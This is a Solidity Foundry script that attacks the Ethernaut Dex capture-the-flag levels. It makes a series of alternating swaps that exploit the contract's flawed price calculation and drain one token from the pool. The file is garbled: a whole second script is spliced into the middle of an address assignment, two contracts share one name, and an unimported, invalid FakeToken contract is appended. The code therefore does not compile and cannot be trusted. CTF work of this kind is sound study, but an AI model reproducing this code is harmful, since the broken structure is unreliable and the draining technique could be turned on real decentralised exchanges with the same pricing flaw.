// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "../../src/Ethernaut/dex2.sol";

contract AttackDexScript is Script {
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address level23 = // SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "../../src/Ethernaut/dex.sol";

contract AttackDexScript is Script {
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address level22 = 0x0a4Dee5fc56eB9c00363016619859E69B43efc23;
        Dex dex = Dex(payable(level22));
        address token1 = dex.token1();
        address token2 = dex.token2();

        dex.approve(address(dex), type(uint256).max);

        console.log("First swap");
        console.log("Swap Price 1/2", dex.getSwapPrice(token1, token2, 10));
        console.log("Swap Price 2/1", dex.getSwapPrice(token2, token1, 10));

        dex.swap(token1, token2, 10);

        console.log("Second swap");
        console.log("Swap Price 1/2", dex.getSwapPrice(token1, token2, 10));
        console.log("Swap Price 2/1", dex.getSwapPrice(token2, token1, 10));

        dex.swap(token2, token1, 20);

        dex.swap(token1, token2, 24);

        dex.swap(token2, token1, 30);

        dex.swap(token1, token2, 40);

        dex.swap(token2, token1, 47);

        console.log("Balance of token1", dex.balanceOf(token1, address(dex)));
        console.log("Balance of token2", dex.balanceOf(token2, address(dex)));

        vm.stopBroadcast();
    }
}
;
        Dex dex = Dex(payable(level22));
        address token1 = dex.token1();
        address token2 = dex.token2();

        dex.approve(address(dex), type(uint256).max);

        console.log("First swap");
        console.log("Swap Price 1/2", dex.getSwapPrice(token1, token2, 10));
        console.log("Swap Price 2/1", dex.getSwapPrice(token2, token1, 10));

        dex.swap(token1, token2, 10);

        console.log("Second swap");
        console.log("Swap Price 1/2", dex.getSwapPrice(token1, token2, 10));
        console.log("Swap Price 2/1", dex.getSwapPrice(token2, token1, 10));

        dex.swap(token2, token1, 20);

        dex.swap(token1, token2, 24);

        dex.swap(token2, token1, 30);

        dex.swap(token1, token2, 40);

        dex.swap(token2, token1, 47);

        console.log("Balance of token1", dex.balanceOf(token1, address(dex)));
        console.log("Balance of token2", dex.balanceOf(token2, address(dex)));

        vm.stopBroadcast();
    }
}

contract FakeToken is ERC20 {
    constructor() public ERC20("FakeToken", "FAKE") {
        _mint(msg.sender, 500);
    }
}